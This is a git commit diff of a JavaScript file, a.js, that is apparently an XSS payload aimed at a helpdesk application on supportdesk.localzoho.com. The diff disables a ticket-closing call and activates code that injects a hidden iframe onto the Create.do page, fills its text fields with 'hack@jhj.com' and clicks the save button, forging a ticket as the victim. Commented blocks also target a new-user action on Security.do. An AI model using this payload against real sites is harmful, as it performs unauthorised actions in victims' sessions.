db2ce81495e52dbc48ac0d28d0a5954e0486817f
Nandha <mail.nandha30@gmail.com>
2016-10-21 16:40:03 +0530

    Update a.js
    hh

--- a.js
+++ a.js
@@ -1,6 +1,6 @@
 //Closing a Ticket.
 //alert("XSS");
-var statusVal = getClosedLabel();assignValue('Cases','e01c0e3e9779439f11465f4d53c73f470b498ee34174141d',encodeURIComponent(statusVal),'Status');
+//var statusVal = getClosedLabel();assignValue('Cases','e01c0e3e9779439f11465f4d53c73f470b498ee34174141d',encodeURIComponent(statusVal),'Status');
 
 // var iframe = jQuery("<iframe></iframe>");
 // jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
@@ -28,13 +28,13 @@ var statusVal = getClosedLabel();assignValue('Cases','e01c0e3e9779439f11465f4d53
 // }
 
 //Adding  Ticket
-// var iframe = jQuery("<iframe></iframe>");
-// jQuery(iframe).attr("src","Create.do?frameorigin=https://supportdesk.localzoho.com");
-// jQuery(iframe).attr("onload","add_Ticket()");
+var iframe = jQuery("<iframe></iframe>");
+jQuery(iframe).attr("src","Create.do?frameorigin=https://supportdesk.localzoho.com");
+jQuery(iframe).attr("onload","add_Ticket()");
 
-// jQuery("body").append(iframe);
+jQuery("body").append(iframe);
 
-// function add_Ticket(){
-// jQuery(iframe).contents().find("input:text").val('hack@jhj.com');
-// jQuery(iframe).contents().find('#saveButtonId').click();
-// }
+function add_Ticket(){
+jQuery(iframe).contents().find("input:text").val('hack@jhj.com');
+jQuery(iframe).contents().find('#saveButtonId').click();
+}
